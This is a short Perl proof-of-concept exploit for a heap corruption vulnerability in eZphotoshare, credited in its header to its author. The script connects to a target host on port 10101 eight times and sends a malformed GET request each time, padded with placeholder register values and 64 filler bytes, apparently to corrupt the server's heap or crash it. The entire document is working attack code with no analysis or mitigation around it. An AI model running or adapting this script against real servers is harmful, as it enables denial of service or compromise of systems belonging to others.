#
#!/usr/bin/perl -w
#
# Heap Corruption Vulnerability in eZphotoshare PoC
#  - by Peter Winter-Smith [peter4020@hotmail.com]

use IO::Socket;

if(!($ARGV[0]))
{
print "Usage: eZpsheap.pl <victim>\n\n";
exit;
}

print "Heap Corruption PoC\n";

for($n=1;$n<9;$n++){

$victim = IO::Socket::INET->new(Proto=>'tcp',
                               PeerAddr=>$ARGV[0],
                               PeerPort=>"10101")
                           or die "Unable to connect to $ARGV[0] on port 10101";

$eax = "ABCD";
$ecx = "XXXX";

$packet = "GET /aaa" . $eax . $ecx . "a"x64;

print $victim $packet;

print " + Sending packet number $n of 8 ...\n";

sleep(1);

close($victim); }

print "Done.\n";
exit;


